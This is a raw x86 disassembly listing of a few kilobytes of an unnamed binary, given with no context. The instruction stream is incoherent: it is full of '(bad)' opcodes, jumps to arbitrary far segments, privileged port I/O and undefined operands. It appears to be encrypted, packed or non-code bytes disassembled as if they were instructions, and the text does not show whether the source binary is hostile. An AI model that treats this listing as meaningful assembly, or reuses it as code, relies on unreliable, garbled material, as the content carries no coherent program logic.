  412efd:	xor    al,0x83
  412eff:	lock add BYTE PTR ds:0xef90e218,al
  412f06:	xor    DWORD PTR [esi+0x7e49e1c2],ebp
  412f0c:	dec    edi
  412f0d:	or     DWORD PTR [ebx+edx*8],eax
  412f10:	loop   0x412f31
  412f12:	dec    esp
  412f13:	pop    ecx
  412f14:	pop    ss
  412f15:	sub    eax,0xedd7fd32
  412f1a:	sbb    edi,ebx
  412f1c:	jmp    0xbdc4:0x9704411a
  412f23:	and    BYTE PTR ss:[edi-0x47ed92dd],cl
  412f2a:	push   esi
  412f2b:	frstor [edx-0x1e]
  412f2e:	mov    esp,0xaa5df748
  412f33:	lods   eax,DWORD PTR ds:[esi]
  412f34:	fsubr  QWORD PTR [edx]
  412f36:	mov    esp,0xf394d26
  412f3b:	adc    ecx,DWORD PTR [eax]
  412f3d:	push   0xd353b450
  412f42:	adc    eax,0x59b0c13b
  412f47:	xor    al,0xc4
  412f49:	scas   eax,DWORD PTR es:[edi]
  412f4a:	sbb    BYTE PTR [eax-0x5d],dh
  412f4d:	shl    BYTE PTR [eax],cl
  412f4f:	xor    DWORD PTR [ebp+0xc32890f],edi
  412f55:	mov    al,0x11
  412f57:	(bad)  
  412f58:	mov    esi,ebx
  412f5a:	inc    ebx
  412f5b:	ret    0xe659
  412f5e:	mov    DWORD PTR [ebp+0xb],ebp
  412f61:	xchg   esi,eax
  412f62:	cs cwde 
  412f64:	pop    edi
  412f65:	mov    bl,0x1a
  412f67:	popf   
  412f68:	sti    
  412f69:	and    edx,esp
  412f6b:	out    0xe7,eax
  412f6d:	push   0xc63a90c1
  412f72:	ss hlt 
  412f74:	jge    0x412f69
  412f76:	push   ebx
  412f77:	pushf  
  412f78:	jo     0x412f69
  412f7a:	and    ebp,ebp
  412f7c:	jne    0x412f51
  412f7e:	(bad)
  412f81:	cmc    
  412f82:	jae    0x412f4d
  412f84:	dec    esp
  412f85:	push   es
  412f86:	out    0x4e,eax
  412f88:	(bad)  
  412f89:	jb     0x412f52
  412f8b:	scas   al,BYTE PTR es:[edi]
  412f8c:	std    
  412f8d:	addr16 in al,dx
  412f8f:	push   0x6717cd7
  412f94:	pushf  
  412f95:	fistp  QWORD PTR ss:[eax+0x70]
  412f99:	xor    ebp,DWORD PTR [edx]
  412f9b:	loop   0x412fa8
  412f9d:	add    ah,BYTE PTR [eax+0x1d]
  412fa0:	es xchg esi,eax
  412fa2:	jl     0x412f77
  412fa4:	mov    ?,WORD PTR [ebx+0x1d]
  412fa7:	push   cs
  412fa8:	xchg   ebp,eax
  412fa9:	aam    0x62
  412fab:	loope  0x412fd1
  412fad:	xchg   BYTE PTR [ecx+0x50],bh
  412fb0:	jge    0x412f4a
  412fb2:	dec    esp
  412fb3:	mov    eax,0x26c5761e
  412fb8:	outs   dx,DWORD PTR ds:[esi]
  412fb9:	adc    cl,cl
  412fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fbc:	xor    dl,BYTE PTR [esi-0x59]
  412fbf:	retf   
  412fc0:	pusha  
  412fc1:	ret    0xbc7f
  412fc4:	cmp    ebp,ebp
  412fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fc7:	mov    ecx,0x38cba51a
  412fcc:	fdivr  QWORD PTR [esi-0x39d1dcda]
  412fd2:	mov    ax,0x10aa
  412fd6:	and    DWORD PTR fs:[ecx+0x4bfc136d],eax
  412fdd:	enter  0xdf5e,0x37
  412fe1:	shl    DWORD PTR ds:0x89c0870c,1
  412fe7:	sti    
  412fe8:	add    edx,edx
  412fea:	(bad)  
  412feb:	ret    
  412fec:	push   ebx
  412fed:	add    ebp,DWORD PTR [ebx+0x2e]
  412ff0:	xchg   esi,eax
  412ff1:	fistp  QWORD PTR [ebp-0x28]
  412ff4:	xchg   edx,eax
  412ff5:	nop
  412ff6:	test   al,0x54
  412ff8:	sub    eax,DWORD PTR [ebp+0x72]
  412ffb:	popa   
  412ffc:	scas   eax,DWORD PTR es:[edi]
  412ffd:	or     edx,edi
  412fff:	pushf  
  413000:	sub    eax,0xd0369fde
  413005:	pushw  ds
  413007:	lds    esi,FWORD PTR [edi+0x7a144b8d]
  41300d:	push   edi
  41300e:	lahf   
  41300f:	and    al,0xba
  413011:	add    eax,0x160932b1
  413016:	pop    ds
  413017:	(bad)  
  413018:	pop    esi
  413019:	mov    ss,WORD PTR [esi+0x4d4e13a5]
  41301f:	sub    dh,BYTE PTR [ecx+0x32]
  413022:	das    
  413023:	push   0x3b
  413025:	jb     0x412ff5
  413027:	into   
  413028:	xor    ah,BYTE PTR [edx-0x48e7d727]
  41302e:	lahf   
  41302f:	mov    al,ds:0xd76f8df2
  413034:	popa   
  413035:	repnz repz les eax,FWORD PTR [edx+0x2c87526f]
  41303d:	out    dx,al
  41303e:	iret   
  41303f:	(bad)  
  413040:	mov    cl,0x2b
  413042:	inc    edi
  413043:	fld    DWORD PTR [ebp-0x38]
  413046:	shr    BYTE PTR [edx],0x61
  413049:	and    eax,0x55aa8717
  41304e:	push   eax
  41304f:	mov    es,WORD PTR [edi+esi*4-0x1e]
  413053:	cli    
  413054:	and    BYTE PTR [edx+0x41],dh
  413057:	data16 cld 
  413059:	lods   al,BYTE PTR ds:[esi]
  41305a:	in     al,dx
  41305b:	pop    ebx
  41305c:	push   edx
  41305d:	sub    al,0x8c
  41305f:	or     al,0x52
  413061:	push   ss
  413062:	jae    0x412ff6
  413064:	cmp    al,0xae
  413066:	neg    BYTE PTR [esi+0x356ee9fa]
  41306c:	shl    bh,0x9
  41306f:	js     0x413005
  413071:	pushf  
  413072:	call   DWORD PTR [edx+0xad52232]
  413078:	adc    DWORD PTR [esi+ebx*4],edi
  41307b:	mov    al,cl
  41307d:	dec    eax
  41307e:	inc    ebp
  41307f:	jmp    0xfcddc86
  413084:	retf   0xa74e
  413087:	ficom  DWORD PTR fs:[esi]
  41308a:	int    0xcd
  41308c:	and    al,0xcc
  41308e:	test   BYTE PTR [edx+0x5e9610a0],ah
  413094:	loopne 0x4130c0
  413096:	fwait
  413097:	inc    ecx
  413098:	add    dl,al
  41309a:	cmc    
  41309b:	inc    eax
  41309c:	push   es
  41309d:	pop    edx
  41309e:	aas    
  41309f:	jle    0x413085
  4130a1:	add    esi,eax
  4130a3:	xor    DWORD PTR [edi+edi*1],ecx
  4130a6:	cmp    al,0xfc
  4130a8:	pop    edi
  4130a9:	cli    
  4130aa:	(bad)  
  4130ab:	pop    ecx
  4130ac:	into   
  4130ad:	fdivr  DWORD PTR [ecx]
  4130af:	mov    fs,WORD PTR [esi]
  4130b1:	sub    ah,BYTE PTR [ecx]
  4130b3:	adc    eax,0x6541cd5
  4130b8:	aam    0x1e
  4130ba:	cmp    al,0xb6
  4130bc:	and    al,0x29
  4130be:	fcom   DWORD PTR [ecx+eiz*2+0x7a]
  4130c2:	mov    DWORD PTR [esi],edi
  4130c4:	xchg   edx,eax
  4130c5:	out    0x40,eax
  4130c7:	xor    BYTE PTR ds:0x2730aa66,bh
  4130cd:	sbb    BYTE PTR [ecx+eax*2+0x65aa3ddc],cl
  4130d4:	dec    ebx
  4130d5:	push   edx
  4130d6:	arpl   WORD PTR [edx-0x1bc071ac],si
  4130dc:	pop    esi
  4130dd:	mov    eax,0xd6cad18c
  4130e2:	lods   eax,DWORD PTR ds:[esi]
  4130e3:	fsubr  QWORD PTR [esi-0x3019f74f]
  4130e9:	aam    0x2f
  4130eb:	mov    ah,0x89
  4130ed:	jmp    0x1eca27cb
  4130f2:	repnz fild DWORD PTR cs:[eax]
  4130f6:	push   0x40
  4130f8:	jae    0x41309a
  4130fa:	(bad)  
  4130fb:	push   0xffffffa8
  4130fd:	and    DWORD PTR [eax+0x58],ebp
  413100:	or     al,0x70
  413102:	pusha  
  413103:	fst    QWORD PTR [ecx-0x49]
  413106:	in     eax,0xb5
  413108:	aad    0xa
  41310a:	pusha  
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	aas    
  41310d:	jmp    0xe4fcade3
  413112:	jb     0x413138
  413114:	jne    0x4130aa
  413116:	loope  0x41316b
  413118:	jo     0x413114
  41311a:	push   ebx
  41311b:	adc    eax,0xf74914ef
  413120:	adc    eax,DWORD PTR [ebx+0x6c]
  413123:	push   edx
  413124:	or     esi,DWORD PTR ds:0x6182afe0
  41312a:	imul   esp,DWORD PTR [esi+0x7a],0x2c
  41312e:	fs mov edx,?
  413131:	push   ebx
  413132:	test   al,0x70
  413134:	jbe    0x41318f
  413136:	fstp   QWORD PTR [esi+0x2d41363e]
  41313c:	sbb    esp,DWORD PTR [ecx+0x19]
  41313f:	(bad)  
  413140:	lea    eax,[ecx+ebp*4+0x6e]
  413144:	loope  0x413144
  413146:	mov    gs,WORD PTR [ebp-0x7ef819fb]
  41314c:	(bad)  
  41314d:	cmp    al,0x2c
  41314f:	inc    ebx
  413150:	xor    DWORD PTR [ebx],edi
  413152:	daa    
  413153:	in     eax,0x9d
  413155:	push   0x34
  413157:	and    ebx,DWORD PTR [ecx-0x5c]
  41315a:	cmp    al,0xda
  41315c:	sbb    cl,bh
  41315e:	push   edi
  41315f:	mov    edx,0x3f797f6b
  413164:	pop    es
  413165:	sbb    eax,0xb6cc69bd
  41316a:	mov    esi,0x181ed630
  41316f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  413171:	call   0x8723:0x32ff81e7
  413178:	dec    eax
  413179:	mov    ecx,0x3ca774d1
  41317e:	sub    DWORD PTR [ebx],ecx
  413180:	inc    edi
  413181:	in     al,dx
  413182:	lea    ebp,[ebx-0x2a]
  413185:	daa    
  413186:	cs aam 0x80
  413189:	adc    dl,BYTE PTR [ecx+0x5d]
  41318c:	and    bh,BYTE PTR [ebx+eiz*2+0x16]
  413190:	mov    ecx,0xfba2e60c
  413195:	xchg   ecx,eax
  413196:	xor    BYTE PTR [edx+0x5c],dl
  413199:	pop    es
  41319a:	aaa    
  41319b:	push   esi
  41319c:	nop
  41319d:	push   ebp
  41319e:	sbb    BYTE PTR [ebx+0x49],bh
  4131a1:	call   0x5ed7:0x9d88842
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	mov    BYTE PTR [edx+0x7fd02477],ch
  4131af:	add    bh,al
  4131b1:	(bad)  
  4131b2:	mov    ebx,0x40f2b522
  4131b7:	test   BYTE PTR ds:0x474d2a0c,dl
  4131bd:	aaa    
  4131be:	imul   esi,DWORD PTR [esi],0x85f1f767
  4131c4:	sahf   
  4131c5:	or     al,0xa8
  4131c7:	push   ds
  4131c8:	pop    esi
  4131c9:	mov    ebp,gs
  4131cb:	out    0x8f,eax
  4131cd:	adc    edx,ebp
  4131cf:	push   edi
  4131d0:	imul   ebp,DWORD PTR [esi],0x8d5c028
  4131d6:	aaa    
  4131d7:	fidiv  DWORD PTR ds:[ebp+0x3568915]
  4131de:	leave  
  4131df:	inc    BYTE PTR [eax]
  4131e1:	ds dec edx
  4131e3:	cdq    
  4131e4:	mov    dl,0x59
  4131e6:	jo     0x413262
  4131e8:	add    edi,edx
  4131ea:	aad    0x1d
  4131ec:	dec    esp
  4131ed:	sub    al,0xf6
  4131ef:	dec    esp
  4131f0:	xchg   esp,eax
  4131f1:	xchg   BYTE PTR [edi-0x6d],bh
  4131f4:	mov    al,ds:0xc114c814
  4131f9:	push   ebx
  4131fa:	div    dl
  4131fc:	pop    eax
  4131fd:	jb     0x41320b
  4131ff:	push   0x42
  413201:	sbb    DWORD PTR [ebx-0x5e],ebx
  413204:	and    BYTE PTR [ebp+0x4617235d],cl
  41320a:	mov    esp,?
  41320c:	push   edi
  41320d:	pop    ebp
  41320e:	push   ds
  41320f:	cmp    ecx,DWORD PTR [ecx-0x58]
  413212:	daa    
  413213:	xchg   esp,eax
  413214:	das    
  413215:	clc    
  413216:	jecxz  0x4131ae
  413218:	fs pusha 
  41321a:	outs   dx,DWORD PTR ds:[esi]
  41321b:	and    dl,BYTE PTR [edi]
  41321d:	pushf  
  41321e:	mov    edi,0xf82283bd
  413223:	jmp    0xae6756b7
  413228:	outs   dx,DWORD PTR ds:[esi]
  413229:	push   ecx
  41322a:	mov    edx,0xb59bada6
  41322f:	dec    edi
  413230:	fsubp  st(7),st
  413232:	dec    edi
  413233:	dec    ebx
  413234:	fcom   QWORD PTR [ecx]
  413236:	lods   al,BYTE PTR ds:[esi]
  413237:	mul    ebx
  413239:	cmp    BYTE PTR [esi+0x44],ah
  41323c:	pop    ebp
  41323d:	or     al,0x3e
  41323f:	ja     0x41323e
  413241:	push   edi
  413242:	add    eax,DWORD PTR [eax]
  413244:	and    al,0xa1
  413246:	outs   dx,DWORD PTR ds:[esi]
  413247:	mov    ah,0x0
  413249:	sbb    al,0xd8
  41324b:	pop    ebx
  41324c:	js     0x413272
  41324e:	lds    ebx,FWORD PTR [edx-0x3b]
  413251:	cmp    al,0x69
  413253:	daa    
  413254:	imul   edi,esi,0xe50f3503
  41325a:	loope  0x413297
  41325c:	and    al,0x9e
  41325e:	adc    esi,esi
  413260:	(bad)  
  413261:	out    dx,eax
  413262:	add    eax,0xe7026115
  413267:	adc    al,ch
  413269:	loopne 0x4132b8
  41326b:	push   ecx
  41326c:	dec    ecx
  41326d:	(bad)  
  41326e:	adc    BYTE PTR [ebp+0x45b8a5bd],bh
  413274:	out    dx,al
  413275:	popf   
  413276:	inc    ebp
  413277:	pop    esp
  413278:	jnp    0x4132a1
  41327a:	xor    eax,0xd1b8c03e
  41327f:	xor    BYTE PTR ds:0x400b53b8,0xfa
  413286:	pop    ecx
  413287:	fidivr WORD PTR [esp+eax*2-0x31]
  41328b:	add    eax,0x231de3e
  413290:	jae    0x413270
  413292:	xchg   esp,eax
  413293:	mov    esi,0xc81f9d00
  413298:	and    bl,bl
  41329a:	xchg   BYTE PTR [edi],bh
  41329c:	icebp  
  41329d:	bound  ebp,QWORD PTR [esi]
  41329f:	xlat   BYTE PTR ds:[ebx]
  4132a0:	sbb    al,0x78
  4132a2:	ficom  WORD PTR [eax]
  4132a4:	aaa    
  4132a5:	dec    edi
  4132a6:	push   ebp
  4132a7:	pop    edx
  4132a8:	push   es
  4132a9:	scas   eax,DWORD PTR es:[edi]
  4132aa:	xchg   esi,eax
  4132ab:	mov    BYTE PTR [ebp-0xdb0a1d],al
  4132b1:	sub    BYTE PTR [ebx],bl
  4132b3:	idiv   bh
  4132b5:	out    0x92,al
  4132b7:	in     al,dx
  4132b8:	cs xor al,0xf
  4132bb:	pop    ecx
  4132bc:	push   ds
  4132bd:	ret    0x9fe2
  4132c0:	(bad)  
  4132c1:	mov    ds:0xccfd4892,al
  4132c6:	mov    ch,BYTE PTR [ebx+ebx*8]
  4132c9:	sbb    al,bh
  4132cb:	dec    esi
  4132cc:	push   esi
  4132cd:	jmp    0x53271e77
  4132d2:	xor    DWORD PTR [ecx-0x50],0x51
  4132d6:	inc    ecx
  4132d7:	mov    ah,0x4b
  4132d9:	dec    esi
  4132da:	popa   
  4132db:	mov    DWORD PTR [ecx],ebx
  4132dd:	mov    al,ds:0x68b1a213
  4132e2:	in     al,0xe4
  4132e4:	into   
  4132e5:	pusha  
  4132e6:	loop   0x4132aa
  4132e8:	rcl    eax,0x3f
  4132eb:	(bad)  
  4132ec:	mov    ds:0x5f078265,al
  4132f1:	imul   ecx,DWORD PTR [ebx],0x6cfc8bf6
  4132f7:	mov    dh,0xc3
  4132f9:	imul   eax,DWORD PTR [eax-0x71d28453],0x152e518e
  413303:	dec    ebp
  413304:	sti    
  413305:	dec    ebx
  413306:	ja     0x413371
  413308:	cmp    DWORD PTR [esi-0x2a3a2b4c],0xffffffd7
  41330f:	cmp    BYTE PTR [edi-0x62e17ccb],ch
  413315:	ss clc 
  413317:	adc    BYTE PTR gs:[eax],0x57
  41331b:	pop    ecx
  41331c:	out    dx,eax
  41331d:	fucomi st,st(3)
  41331f:	push   DWORD PTR [edi+0x6844943c]
  413325:	mov    ebp,0x30298582
  41332a:	shr    DWORD PTR [edi+0x72d11184],1
  413330:	daa    
  413331:	hlt    
  413332:	xchg   DWORD PTR [edi-0x3d20ea5],edx
  413338:	xchg   esp,eax
  413339:	int    0xab
  41333b:	dec    eax
  41333c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333d:	xor    ah,BYTE PTR [eax]
  41333f:	add    eax,0x7745a16d
  413344:	ja     0x413322
  413346:	ins    DWORD PTR es:[edi],dx
  413347:	or     BYTE PTR [ebx-0x6c0b5797],dh
  41334d:	xchg   edx,eax
  41334e:	sbb    bh,al
  413350:	neg    DWORD PTR [edx]
  413352:	jbe    0x4133af
  413354:	push   ebp
  413355:	imul   BYTE PTR [ecx+0x7d4fd70b]
  41335b:	xchg   edi,eax
  41335c:	out    0x9f,eax
  41335e:	adc    BYTE PTR [ebp+0x30ad7584],dh
  413364:	xlat   BYTE PTR ds:[ebx]
  413365:	pop    ecx
  413366:	push   ebp
  413367:	sbb    esi,DWORD PTR [ebp+edx*8+0x12]
  41336b:	and    DWORD PTR [edi+0x220dc325],edx
  413371:	lods   eax,DWORD PTR ds:[esi]
  413372:	xor    cl,BYTE PTR [esi+0x1d826166]
  413378:	push   0x3611c8e6
  41337d:	sub    DWORD PTR [edi],eax
  41337f:	(bad)  
  413381:	aas    
  413382:	aam    0x5c
  413384:	test   ah,dl
  413386:	fadd   DWORD PTR [edx]
  413388:	pop    edx
  413389:	dec    edx
  41338a:	dec    esi
  41338b:	fdivr  st,st(1)
  41338d:	aaa    
  41338e:	push   ecx
  41338f:	sbb    al,0x7f
  413391:	repz mov eax,ds:0x100e9c37
  413397:	xchg   ebx,eax
  413398:	dec    esi
  413399:	js     0x413391
  41339b:	data16 aaa 
  41339d:	dec    ebx
  41339e:	ror    DWORD PTR [esi+0x2a],cl
  4133a1:	in     eax,0x76
  4133a3:	mov    ecx,0x6ec8b15b
  4133a8:	das    
  4133a9:	dec    esi
  4133aa:	nop    esi
  4133ad:	sub    eax,0x2a399910
  4133b2:	sbb    dl,bh
  4133b4:	pushf  
  4133b5:	dec    eax
  4133b6:	mov    bh,0x8c
  4133b8:	dec    ebp
  4133b9:	aam    0x47
  4133bb:	mov    bl,0x1
  4133bd:	xchg   ebp,eax
  4133be:	xor    DWORD PTR [ebx-0x3d],0x91a74388
  4133c5:	dec    ebp
  4133c6:	mov    es,WORD PTR [edi]
  4133c8:	retf   0xede7
  4133cb:	mov    esp,0xfca383ab
  4133d0:	in     eax,dx
  4133d1:	out    0x27,eax
  4133d3:	outs   dx,BYTE PTR ds:[esi]
  4133d4:	int    0xa3
  4133d6:	iret   
  4133d7:	ja     0x413444
  4133d9:	xchg   DWORD PTR [eax],edi
  4133db:	out    dx,eax
  4133dc:	pop    ebp
  4133dd:	add    al,0x90
  4133df:	ds jb  0x4133a5
  4133e2:	into   
  4133e3:	pop    esi
  4133e4:	out    0x8e,eax
  4133e6:	ja     0x4133f6
  4133e8:	ss mov eax,0x68af6465
  4133ee:	inc    esi
  4133ef:	loopne 0x4133ef
  4133f1:	and    DWORD PTR [edi-0x10],ecx
  4133f4:	jg     0x41346d
  4133f6:	push   ebx
  4133f7:	test   DWORD PTR [edx-0x1f2ce721],ecx
  4133fd:	mov    bh,BYTE PTR [ebx*2-0x7f50916c]
  413404:	jp     0x4133de
  413406:	xchg   edx,eax
  413407:	mov    cl,0x54
  413409:	sbb    bl,BYTE PTR [ebx]
  41340b:	adc    edi,esp
  41340d:	dec    esp
  41340e:	cli    
  41340f:	cmp    BYTE PTR [edx+0x55],bh
  413412:	adc    al,0x50
  413414:	stc    
  413415:	dec    ebp
  413416:	adc    BYTE PTR [ecx-0x56aa8e6c],al
  41341c:	mov    ds:0xf4cc5d49,eax
  413422:	mov    edi,0x11b0aebf
  413427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413428:	xchg   ebp,eax
  413429:	in     eax,0x44
  41342b:	inc    ecx
  41342c:	lods   al,BYTE PTR ds:[esi]
  41342d:	push   eax
  41342e:	mov    esp,0xbc7cb9f9
  413433:	das    
  413434:	push   ebx
  413435:	or     al,al
  413437:	das    
  413438:	or     eax,0xea1d8ff4
  41343d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41343e:	sbb    eax,0x22d08dc
  413443:	pop    esp
  413444:	inc    ecx
  413445:	pop    esi
  413446:	mov    al,0xb6
  413448:	addr16 add ebp,esi
  41344b:	das    
  41344c:	(bad)  
  41344d:	aaa    
  41344e:	mov    gs,eax
  413450:	enter  0xbebb,0xad
  413454:	loop   0x4133d6
  413456:	sbb    esi,DWORD PTR [eax+ecx*1]
  413459:	mov    eax,0x5ff90655
  41345e:	push   edi
  41345f:	inc    ecx
  413460:	js     0x413488
  413462:	retf   
  413463:	pop    esi
  413464:	(bad)  
  413465:	(bad)  
  413466:	imul   ebp,ecx,0xffffffd9
  413469:	stc    
  41346a:	xchg   ecx,eax
  41346b:	or     eax,0xd8066df5
  413470:	(bad)  
  413471:	sub    BYTE PTR [eax+0x21950339],dh
  413477:	cmp    ebx,ebx
  413479:	rcl    DWORD PTR [ecx-0x48df3a59],1
  41347f:	adc    dl,cl
  413481:	push   ebx
  413482:	add    BYTE PTR [ebx],0xae
  413485:	add    DWORD PTR [esi-0x61af220a],esi
  41348b:	ins    DWORD PTR es:[edi],dx
  41348c:	pop    ecx
  41348d:	sar    DWORD PTR [eax-0x2c],cl
  413490:	and    DWORD PTR [eax+0x7],eax
  413493:	cwde   
  413494:	pop    ecx
  413495:	cli    
  413496:	in     al,0x5c
  413498:	xchg   ebp,eax
  413499:	aaa    
  41349a:	popa   
  41349b:	mov    ?,WORD PTR [esi]
  41349d:	mov    eax,ds:0x9db2d883
  4134a2:	rcl    dh,1
  4134a4:	icebp  
  4134a5:	ins    BYTE PTR es:[edi],dx
  4134a6:	in     eax,dx
  4134a7:	loope  0x413497
  4134a9:	mov    DWORD PTR [ebx],edx
  4134ab:	inc    esi
  4134ac:	sar    DWORD PTR [edi],1
  4134ae:	mov    ebx,DWORD PTR ds:0x6575f2e8
  4134b4:	inc    ebp
  4134b5:	pop    ebx
  4134b6:	fsubr  DWORD PTR [ebp-0xe]
  4134b9:	pop    ss
  4134ba:	dec    esp
  4134bb:	or     ch,BYTE PTR [edi]
  4134bd:	frndint 
  4134bf:	dec    edx
  4134c0:	pop    ss
  4134c1:	ins    DWORD PTR es:[edi],dx
  4134c2:	shr    ah,1
  4134c4:	out    dx,eax
  4134c5:	push   ebx
  4134c6:	pop    esi
  4134c7:	sub    eax,0x511922ff
  4134cc:	je     0x41346b
  4134ce:	mov    ch,0xd3
  4134d0:	jno    0xeca79ee0
  4134d6:	lds    edx,FWORD PTR [ebx]
  4134d8:	(bad)  
  4134d9:	add    bh,BYTE PTR [ebx-0x6aa6e03]
  4134df:	imul   esi,DWORD PTR [ebx],0x3d39cd2c
  4134e5:	xor    bl,BYTE PTR [ebp+0x75]
  4134e8:	and    eax,0xe4b1a0cf
  4134ed:	and    BYTE PTR [edx+0x4e81a2a6],dl
  4134f3:	ret    0xf279
  4134f6:	inc    edi
  4134f7:	inc    ebx
  4134f8:	fdivr  QWORD PTR [edi+0x6f]
  4134fb:	pop    esi
  4134fc:	push   ecx
  4134fd:	push   cs
  4134fe:	adc    al,0xd1
  413501:	inc    esi
  413502:	bound  esi,QWORD PTR [eax+0x5e]
  413505:	inc    ecx
  413506:	mov    ch,0x43
  413508:	mov    al,0x71
  41350a:	test   eax,0xfc0d72e6
  41350f:	scas   eax,DWORD PTR es:[edi]
  413510:	out    dx,eax
  413511:	jb     0x413547
  413513:	and    BYTE PTR [ebp-0x12],0xf3
  413517:	xchg   edx,eax
  413518:	dec    ebp
  413519:	rol    BYTE PTR ds:0x5388eca1,cl
  41351f:	outs   dx,DWORD PTR ds:[esi]
  413520:	sub    BYTE PTR [edi],al
  413522:	pop    ss
  413523:	sub    al,0x69
  413525:	jb     0x41353b
  413527:	jecxz  0x413529
  413529:	cmp    dh,dl
  41352b:	cwde   
  41352c:	aam    0xad
  41352e:	loop   0x41357a
  413530:	xchg   BYTE PTR [ecx-0x570e719e],bl
  413536:	(bad)  
  413538:	jmp    0xcc8f2537
  41353d:	fwait
  41353e:	loope  0x4135ae
  413540:	mov    edi,0x2dc3738c
  413545:	fsub   QWORD PTR [edi+0x1fa209ad]
  41354b:	sub    BYTE PTR [ebx+ebx*8],ch
  41354e:	dec    edx
  41354f:	mov    eax,ds:0x57527b0f
  413554:	push   ecx
  413555:	faddp  st(4),st
  413557:	outs   dx,BYTE PTR ds:[esi]
  413558:	jge    0x413507
  41355a:	int3   
  41355b:	jb     0x4135ad
  41355d:	and    DWORD PTR [edi],ecx
  41355f:	pop    eax
  413560:	pop    ebp
  413561:	lds    ecx,FWORD PTR [eax]
  413563:	cwde   
  413564:	(bad)  
  413565:	push   edi
  413566:	dec    edi
  413567:	lods   al,BYTE PTR ds:[esi]
  413568:	test   al,0x8
  41356a:	std    
  41356b:	adc    DWORD PTR [edx+0x7bc8d2cc],ebx
  413571:	push   ebx
  413572:	xor    al,0x0
  413574:	stos   DWORD PTR es:[edi],eax
  413575:	mov    bh,0x2
  413577:	outs   dx,DWORD PTR ds:[esi]
  413578:	stos   DWORD PTR es:[edi],eax
  413579:	aaa    
  41357a:	test   DWORD PTR [edx-0xf],ebp
  41357d:	test   DWORD PTR [edx+0x38a2e25],ebp
  413583:	cs jg  0x413537
  413586:	test   al,0x60
  413588:	mov    edx,0xfd4674f1
  41358d:	rcr    DWORD PTR [edi+ebp*4],cl
  413590:	dec    edx
  413591:	stc    
  413592:	lds    eax,FWORD PTR [ebp+0x13]
  413595:	dec    eax
  413596:	mov    al,0x72
  413598:	sub    edi,DWORD PTR [ebx]
  41359a:	pop    ds
  41359b:	push   ecx
  41359c:	mov    DWORD PTR [ecx+0x681c3f18],edi
  4135a2:	jno    0x41354b
  4135a4:	dec    eax
  4135a5:	mov    ds:0xaea3a1ac,eax
  4135aa:	push   ds
  4135ab:	cdq    
  4135ac:	and    esi,eax
  4135ae:	inc    eax
  4135af:	dec    esp
  4135b0:	mov    dl,0x30
  4135b2:	push   ss
  4135b3:	lods   al,BYTE PTR ds:[esi]
  4135b4:	mov    ecx,0xf94db010
  4135b9:	in     al,0xd7
  4135bb:	mov    bh,0xe5
  4135bd:	out    dx,al
  4135be:	dec    eax
  4135bf:	dec    edx
  4135c0:	pushf  
  4135c1:	pop    ss
  4135c2:	and    ch,ch
  4135c4:	jl     0x4135cc
  4135c6:	daa    
  4135c7:	inc    esi
  4135c8:	inc    ebx
  4135c9:	xor    DWORD PTR [ebp-0x1fbb7692],0xfffffff6
  4135d0:	call   0x4382:0x1e80613f
  4135d7:	test   BYTE PTR [ebx-0x5696be4],0xb2
  4135de:	add    bl,bl
  4135e0:	mov    bh,0x1
  4135e2:	xor    BYTE PTR [edx+0x71],al
  4135e5:	fsub   QWORD PTR [ecx-0x6e]
  4135e8:	shr    BYTE PTR [ebp+0x5e91f9f],1
  4135ee:	js     0x413660
  4135f0:	(bad)  
  4135f1:	pop    edi
  4135f2:	out    dx,al
  4135f3:	iret   
  4135f4:	mov    ebp,0xe0662cb1
  4135f9:	loopne 0x4135cf
  4135fb:	pop    ss
  4135fc:	pop    edx
  4135fd:	mov    esi,0x58dc746c
  413602:	pusha  
  413603:	add    bh,BYTE PTR [eax+0x287fda83]
  413609:	add    BYTE PTR [ebx],ah
  41360b:	int    0x51
  41360d:	jae    0x4135a3
  41360f:	mov    ah,0x47
  413611:	cmp    DWORD PTR [ebx-0x2984c43d],edx
  413617:	mov    dl,0xa6
  413619:	loop   0x41365b
  41361b:	aas    
  41361c:	mov    edx,0xa723b9f3
  413621:	inc    ebp
  413622:	and    eax,0x540f1386
  413627:	enter  0xb3e4,0xa5
  41362b:	imul   ebx,DWORD PTR [edx-0x505b98e1],0xffffffaa
  413632:	nop
  413633:	push   edx
  413634:	mov    edi,0xe3d49909
  413639:	mov    ch,bl
  41363b:	jmp    0x4b8a:0x3aa147e6
  413642:	mov    esi,0x378ab25a
  413647:	mov    eax,0xd41e3efb
  41364c:	fiadd  DWORD PTR [ecx+0x62960f1b]
  413652:	adc    dh,BYTE PTR [edx]
  413654:	mov    ds:0x6ff7e6ad,al
  413659:	jl     0x4135e4
  41365b:	test   DWORD PTR [esi-0x33],edi
  41365e:	icebp  
  41365f:	call   0x41bb:0x824fa6af
  413666:	push   eax
  413667:	jne    0x4136a7
  413669:	mov    ch,cl
  41366b:	test   BYTE PTR ds:0xefd754aa,bl
  413671:	data16 mov cl,0xfc
  413674:	repnz pop ecx
  413676:	pop    edx
  413677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413678:	jecxz  0x413612
  41367a:	ret    
  41367b:	inc    eax
  41367c:	fstp   QWORD PTR [ebp+0x30]
  41367f:	bound  esi,QWORD PTR [edx]
  413681:	fld    DWORD PTR [esi+0x15]
  413684:	mov    esp,0x47b35191
  413689:	lods   eax,DWORD PTR ds:[esi]
  41368a:	mov    esp,es
  41368c:	cmp    al,0x7b
  41368e:	call   0x3589:0x5ab8563d
  413695:	shr    DWORD PTR [edx+0x2a],1
  413698:	leave  
  413699:	adc    DWORD PTR [edx],ecx
  41369b:	lods   ax,WORD PTR ds:[esi]
  41369d:	int3   
  41369e:	or     al,BYTE PTR [ecx-0x28991ead]
  4136a4:	mov    DWORD PTR [edx+0x2d],ebx
  4136a7:	repnz cld 
  4136a9:	test   BYTE PTR [ebx],0xda
  4136ac:	pop    ebp
  4136ad:	adc    dl,al
  4136af:	jbe    0x4136ac
  4136b1:	imul   eax,DWORD PTR [ebx+ecx*1-0x18],0xe1a5d5d7
  4136b9:	mov    dh,0x7b
  4136bb:	jne    0x4136e2
  4136bd:	inc    edx
